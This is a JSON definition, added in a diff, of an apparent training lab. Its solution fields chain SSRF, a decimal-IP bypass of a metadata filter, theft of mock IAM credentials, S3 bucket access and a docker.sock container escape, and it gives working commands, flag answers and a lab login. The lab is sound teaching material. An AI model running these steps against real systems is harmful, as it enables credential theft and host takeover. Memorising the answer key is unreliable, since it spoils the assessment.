@@ -1,0 +1,285 @@
+{
+  "title": "LAB 5 — Cloud SSRF & Container Escape",
+  "description": "SSRF to mock IMDS, MinIO credential use, leaked SSH key, Docker socket abuse, and host filesystem access.",
+  "prerequisites": [
+    "Linux CLI",
+    "HTTP basics",
+    "AWS CLI and Docker basics"
+  ],
+  "outcomes": [
+    "Exploit SSRF",
+    "Access mock metadata",
+    "Use leaked credentials",
+    "Access S3-compatible storage",
+    "Query Docker API",
+    "Demonstrate docker.sock escape"
+  ],
+  "state": "UNRELEASED",
+  "levels": [
+    {
+      "title": "Introduction",
+      "level_type": "INFO_LEVEL",
+      "order": 0,
+      "estimated_duration": 0,
+      "minimal_possible_solve_time": null,
+      "content": "# Cloud SSRF & Container Escape\n\nStart on **kali-attacker**. ImageResizer is at `http://172.20.0.10:5000/`. This is an isolated, intentionally vulnerable training environment."
+    },
+    {
+      "title": "Get Access",
+      "level_type": "ACCESS_LEVEL",
+      "order": 1,
+      "estimated_duration": 5,
+      "minimal_possible_solve_time": null,
+      "passkey": "start",
+      "cloud_content": "Open **kali-attacker**, log in as `user` / `Password123`, verify `curl http://172.20.0.10:5000/`, then submit `start`.",
+      "local_content": "Connect to the trainee workstation and submit `start`."
+    },
+    {
+      "title": "SSRF Discovery",
+      "level_type": "TRAINING_LEVEL",
+      "order": 2,
+      "estimated_duration": 10,
+      "minimal_possible_solve_time": 1,
+      "answer": "FLAG{5SRF_c0nf1rm3d}",
+      "answer_variable_name": null,
+      "content": "Force ImageResizer to fetch `http://127.0.0.1:8080/admin`. Submit the value of response header `X-Admin-Panel`.",
+      "solution": "Use `curl -i -X POST http://172.20.0.10:5000/fetch --data-urlencode 'url=http://127.0.0.1:8080/admin'`. Answer: `${ANSWER}`.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Response headers",
+          "content": "Use `curl -i`.",
+          "hint_penalty": 20,
+          "order": 0
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 100,
+      "variant_answers": false,
+      "reference_solution": [],
+      "mitre_techniques": [
+        {
+          "technique_key": "TA0001.T1190"
+        }
+      ],
+      "expected_commands": [
+        "curl"
+      ],
+      "commands_required": true
+    },
+    {
+      "title": "Cloud Metadata Access",
+      "level_type": "TRAINING_LEVEL",
+      "order": 3,
+      "estimated_duration": 10,
+      "minimal_possible_solve_time": 1,
+      "answer": "FLAG{i-0abc123def456}",
+      "answer_variable_name": null,
+      "content": "Retrieve `/latest/meta-data/instance-id` through SSRF. The literal link-local address is blocked. Wrap the discovered ID as `FLAG{<id>}`.",
+      "solution": "Use decimal IPv4 `2852039166`: `http://2852039166/latest/meta-data/instance-id`. Answer: `${ANSWER}`.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Weak filter",
+          "content": "Only the literal hostname is blocked.",
+          "hint_penalty": 20,
+          "order": 0
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 100,
+      "variant_answers": false,
+      "reference_solution": [],
+      "mitre_techniques": [
+        {
+          "technique_key": "TA0006.T1552"
+        }
+      ],
+      "expected_commands": [
+        "curl"
+      ],
+      "commands_required": true
+    },
+    {
+      "title": "IAM Credentials Theft",
+      "level_type": "TRAINING_LEVEL",
+      "order": 4,
+      "estimated_duration": 10,
+      "minimal_possible_solve_time": 1,
+      "answer": "FLAG{AKIA1MDSL34K3D01}",
+      "answer_variable_name": null,
+      "content": "Enumerate the role name and retrieve its credential JSON. Wrap `AccessKeyId` as a flag.",
+      "solution": "Request `/latest/meta-data/iam/security-credentials/`, then append the returned role. Answer: `${ANSWER}`.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Role first",
+          "content": "Enumerate the role before requesting credentials.",
+          "hint_penalty": 20,
+          "order": 0
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 100,
+      "variant_answers": false,
+      "reference_solution": [],
+      "mitre_techniques": [
+        {
+          "technique_key": "TA0006.T1552"
+        }
+      ],
+      "expected_commands": [
+        "curl",
+        "jq"
+      ],
+      "commands_required": true
+    },
+    {
+      "title": "S3 Bucket Access",
+      "level_type": "TRAINING_LEVEL",
+      "order": 5,
+      "estimated_duration": 15,
+      "minimal_possible_solve_time": 1,
+      "answer": "FLAG{backup-2024-11-30.tar.gz}",
+      "answer_variable_name": null,
+      "content": "Use the stolen key and secret against `http://172.20.0.30:9000`. List `techcorp-backups` and wrap the newest filename as a flag. The token is not required by this MinIO service.",
+      "solution": "Export access key and secret, `unset AWS_SESSION_TOKEN`, then run `aws s3 ls ... --endpoint-url http://172.20.0.30:9000`. Answer: `${ANSWER}`.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Custom endpoint",
+          "content": "Use `--endpoint-url`.",
+          "hint_penalty": 20,
+          "order": 0
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 100,
+      "variant_answers": false,
+      "reference_solution": [],
+      "mitre_techniques": [
+        {
+          "technique_key": "TA0008.T1530"
+        }
+      ],
+      "expected_commands": [
+        "aws",
+        "export",
+        "unset"
+      ],
+      "commands_required": true
+    },
+    {
+      "title": "Docker Socket Discovery",
+      "level_type": "TRAINING_LEVEL",
+      "order": 6,
+      "estimated_duration": 20,
+      "minimal_possible_solve_time": 1,
+      "answer": "FLAG{Docker_24.0.5}",
+      "answer_variable_name": null,
+      "content": "Download the newest backup, recover its SSH key, connect to `user@172.20.0.20:2222`, and query `/version` through `/var/run/docker.sock`. Wrap the version as `FLAG{Docker_<version>}`.",
+      "solution": "Extract the archive, read `notes.txt`, `chmod 600` the key, SSH in, then run `curl --unix-socket /var/run/docker.sock http://localhost/version | jq -r .Version`. Answer: `${ANSWER}`.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Read notes",
+          "content": "The archive contains target, port, user, and key.",
+          "hint_penalty": 20,
+          "order": 0
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 150,
+      "variant_answers": false,
+      "reference_solution": [],
+      "mitre_techniques": [
+        {
+          "technique_key": "TA0008.T1552"
+        }
+      ],
+      "expected_commands": [
+        "aws",
+        "tar",
+        "chmod",
+        "ssh",
+        "curl",
+        "jq"
+      ],
+      "commands_required": true
+    },
+    {
+      "title": "Container Escape",
+      "level_type": "TRAINING_LEVEL",
+      "order": 7,
+      "estimated_duration": 20,
+      "minimal_possible_solve_time": 1,
+      "answer": "FLAG{c0nt41n3r_3sc4p3_v14_s0ck3t}",
+      "answer_variable_name": null,
+      "content": "Use the Docker socket to create a temporary container that mounts the host root filesystem, then read host `/root/flag.txt`.",
+      "solution": "Run `docker -H unix:///var/run/docker.sock run --rm -v /:/host alpine:3.19 chroot /host cat /root/flag.txt`. Answer: `${ANSWER}`.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Mount host root",
+          "content": "Bind mount `/` at `/host`.",
+          "hint_penalty": 30,
+          "order": 0
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 200,
+      "variant_answers": false,
+      "reference_solution": [],
+      "mitre_techniques": [
+        {
+          "technique_key": "TA0004.T1611"
+        }
+      ],
+      "expected_commands": [
+        "docker",
+        "chroot",
+        "cat"
+      ],
+      "commands_required": true
+    },
+    {
+      "title": "Knowledge Check",
+      "level_type": "ASSESSMENT_LEVEL",
+      "order": 8,
+      "estimated_duration": 10,
+      "minimal_possible_solve_time": null,
+      "questions": [
+        {
+          "question_type": "MCQ",
+          "text": "Why is docker.sock access usually host-root equivalent?",
+          "points": 100,
+          "penalty": 0,
+          "order": 0,
+          "answer_required": true,
+          "choices": [
+            {
+              "text": "It allows containers with arbitrary host bind mounts",
+              "correct": true,
+              "order": 0
+            },
+            {
+              "text": "It reveals every password automatically",
+              "correct": false,
+              "order": 1
+            }
+          ]
+        }
+      ],
+      "instructions": "Complete the knowledge check.",
+      "assessment_type": "TEST"
+    }
+  ],
+  "estimated_duration": 100,
+  "variant_sandboxes": false
+}
